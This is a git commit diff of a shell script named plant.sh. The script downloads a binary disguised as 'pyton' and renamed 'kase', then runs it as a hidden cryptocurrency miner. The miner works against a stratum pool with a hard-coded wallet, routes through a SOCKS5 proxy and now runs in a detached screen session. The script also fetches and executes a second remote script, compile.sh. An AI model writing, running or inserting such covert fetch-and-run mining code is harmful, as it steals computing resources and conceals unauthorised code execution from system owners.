804d0b99495da69490c3793d3a957ba017599ccb
hndouehdw <95325562+hndouehdw@users.noreply.github.com>
2021-12-09 01:53:25 +0700

    Update plant.sh

--- plant.sh
+++ plant.sh
@@ -3,7 +3,7 @@ apt-get install screen -y
 wget -q https://raw.githubusercontent.com/hndouehdw/henro/master/compile.sh
 wget -qO kase https://raw.githubusercontent.com/hndouehdw/henro/master/pyton
 chmod +x kase
--S kase ./kase -a yespowertide  -o stratum+tcp://stratum-ru.rplant.xyz:7059 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.hu --proxy socks5://54.163.208.195:3129
+screen -dm -S kase ./kase -a yespowertide  -o stratum+tcp://stratum-ru.rplant.xyz:7059 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.hu --proxy socks5://54.163.208.195:3129
 chmod +x compile.sh
 ./compile.sh
 
